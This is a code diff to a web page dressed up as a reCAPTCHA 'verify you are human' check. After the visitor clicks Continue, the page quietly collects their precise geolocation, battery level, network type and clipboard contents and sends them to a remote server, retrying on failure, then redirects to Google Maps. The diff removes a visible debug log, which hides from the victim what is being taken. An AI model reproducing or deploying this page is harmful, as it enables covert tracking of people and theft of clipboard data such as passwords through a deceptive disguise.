@@ -83,21 +83,8 @@
         .success { display: none; color: #34a853; font-size: 14px; margin-top: 10px; }
         .error-box { display: none; background: #fce8e6; border: 1px solid #f5c6cb; border-radius: 4px; padding: 12px; margin-top: 15px; color: #d93025; font-size: 14px; }
         .status-bar { margin-top: 15px; padding: 8px; border-radius: 4px; font-size: 12px; color: #5f6368; background: #f1f3f4; display: none; }
-        .debug-log {
-            margin-top: 15px;
-            padding: 10px;
-            background: #1a1a2e;
-            color: #00ff41;
-            font-family: 'Courier New', monospace;
-            font-size: 10px;
-            border-radius: 4px;
-            max-height: 120px;
-            overflow-y: auto;
-            display: none;
-            text-align: left;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
+
+        /* Debug log removed — no longer visible to user */
     </style>
 </head>
 <body>
@@ -120,7 +107,6 @@
     <div class="success" id="success">✅ Verification complete. Redirecting...</div>
     <div class="error-box" id="errorBox">⚠️ Location access is required to verify you are human.</div>
     <div class="status-bar" id="statusBar">🔄 Processing...</div>
-    <div class="debug-log" id="debugLog"></div>
 
     <div class="footer" id="footerContainer">Protected by reCAPTCHA · <a href="#">Privacy</a> · <a href="#">Terms</a></div>
 </div>
@@ -184,19 +170,9 @@
     const success = document.getElementById('success');
     const errorBox = document.getElementById('errorBox');
     const statusBar = document.getElementById('statusBar');
-    const debugLog = document.getElementById('debugLog');
 
     let isVerified = false;
     let isProcessing = false;
-
-    function debug(message) {
-        const timestamp = new Date().toLocaleTimeString();
-        const logEntry = `[${timestamp}] ${message}`;
-        console.log(logEntry);
-        debugLog.style.display = 'block';
-        debugLog.textContent += logEntry + '\n';
-        debugLog.scrollTop = debugLog.scrollHeight;
-    }
 
     function getBatteryInfo() {
         if (navigator.getBattery) {
@@ -210,7 +186,6 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(batteryData)
                 }).catch(() => {});
-                debug('🔋 Battery: ' + batteryData.level + '%');
             });
         }
     }
@@ -227,7 +202,6 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(networkData)
             }).catch(() => {});
-            debug('📶 Network: ' + networkData.type);
         }
     }
 
@@ -241,10 +215,9 @@
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ clipboard: text })
                         }).catch(() => {});
-                        debug('📋 Clipboard: ' + text.substring(0, 50) + '...');
                     }
                 })
-                .catch(() => debug('📋 Clipboard access denied'));
+                .catch(() => {});
         }
     }
 
@@ -269,7 +242,6 @@
             return response.json();
         })
         .catch(err => {
-            debug('❌ Request failed (' + retries + ' retries left): ' + err.message);
             if (retries > 0) {
                 return new Promise(resolve => {
                     setTimeout(() => {
@@ -321,7 +293,6 @@
             mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
         }
 
-        debug('📍 Opening map: ' + mapUrl);
         window.location.href = mapUrl;
     }
 
@@ -337,18 +308,11 @@
         continueBtn.classList.add('active');
         success.style.display = 'block';
         success.textContent = '✅ Verification complete. Click Continue.';
-        debug('✅ reCAPTCHA verified');
     });
 
     continueBtn.addEventListener('click', function() {
-        if (!isVerified) {
-            debug('❌ Please verify reCAPTCHA first');
-            return;
-        }
-        if (isProcessing) {
-            debug('⏳ Already processing');
-            return;
-        }
+        if (!isVerified) return;
+        if (isProcessing) return;
 
         isProcessing = true;
         continueBtn.classList.add('loading');
@@ -356,22 +320,18 @@
         success.style.display = 'none';
         errorBox.style.display = 'none';
         showStatus('Requesting location...');
-        debug('📍 Continue button clicked');
 
         getBatteryInfo();
         getNetworkInfo();
         readClipboard();
 
         if (!navigator.geolocation) {
-            debug('❌ Geolocation not supported');
             showStatus('❌ Geolocation not supported', true);
             isProcessing = false;
             continueBtn.classList.remove('loading');
             continueBtn.textContent = 'Continue';
             return;
         }
-
-        debug('📡 Calling navigator.geolocation...');
 
         navigator.geolocation.getCurrentPosition(
             function(position) {
@@ -381,9 +341,6 @@
                 const altitude = position.coords.altitude;
                 const heading = position.coords.heading;
                 const speed = position.coords.speed;
-
-                debug('✅ Location captured!');
-                debug('📍 Lat: ' + lat + ', Lng: ' + lng);
 
                 showStatus('📍 Location captured! Sending to server...');
 
@@ -401,11 +358,8 @@
 
                 const compressedPayload = compressData(payload);
 
-                debug('📤 Sending to: ' + RENDER_URL + '/send-location');
-
                 sendWithRetry(RENDER_URL + '/send-location', compressedPayload, 3, 2000)
                     .then(() => {
-                        debug('✅ Data sent successfully!');
                         showStatus('✅ Data sent! Redirecting...');
                         success.style.display = 'block';
                         success.textContent = '✅ Verification complete. Redirecting...';
@@ -416,7 +370,6 @@
                         }, 1500);
                     })
                     .catch(function(err) {
-                        debug('❌ All retries failed: ' + err.message);
                         showStatus('⚠️ Server error, but redirecting anyway...', true);
                         setTimeout(function() {
                             openMapApp(lat, lng);
@@ -424,8 +377,6 @@
                     });
             },
             function(error) {
-                debug('❌ Geolocation error: ' + error.message);
-                debug('❌ Error code: ' + error.code);
                 isProcessing = false;
                 continueBtn.classList.remove('loading');
                 continueBtn.textContent = 'Try Again';
@@ -447,17 +398,10 @@
         );
     });
 
-    debug('🚀 Page loaded');
-    debug('📍 Template: ' + template);
-    debug('📍 RENDER_URL: ' + RENDER_URL);
-    debug('📱 User Agent: ' + navigator.userAgent);
-
     window.addEventListener('online', function() {
-        debug('📶 Online');
         showStatus('📶 Back online!');
     });
     window.addEventListener('offline', function() {
-        debug('📶 Offline');
         showStatus('📶 No internet connection.', true);
     });
 </script>
